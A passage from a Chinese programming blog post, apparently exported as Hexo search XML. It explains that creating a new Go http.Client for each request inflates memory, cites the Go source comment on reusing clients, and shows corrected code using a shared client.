client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样会导致内存疯长，实测。。。</p><p>而且在源码中，作者也有注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; A Client is an HTTP client. Its zero value (DefaultClient) is a</span><br><span class="line">&#x2F;&#x2F; usable client that uses DefaultTransport.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; The Client&#39;s Transport typically has internal state (cached TCP</span><br><span class="line">&#x2F;&#x2F; connections), so Clients should be reused instead of created as</span><br><span class="line">&#x2F;&#x2F; needed. Clients are safe for concurrent use by multiple goroutines.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; A Client is higher-level than a RoundTripper (such as Transport)</span><br><span class="line">&#x2F;&#x2F; and additionally handles HTTP details such as cookies and</span><br><span class="line">&#x2F;&#x2F; redirects.</span><br></pre></td></tr></table></figure><p>因为client结构底层维护了一个连接池，所以不需要每次都新建，正确代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">transport &#x3D; http.Transport&#123;</span><br><span class="line">DisableKeepAlives: true,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client &#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;transport,</span><br><span class="line">Timeout:   10 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">for &#123;</span><br><span class="line">test()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line"></span><br><span class="line">request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">resp, err :&#x3D; client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  其实看似简单的功能背后也有很多玄机，随便看看都是一个个大坑（笑）</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
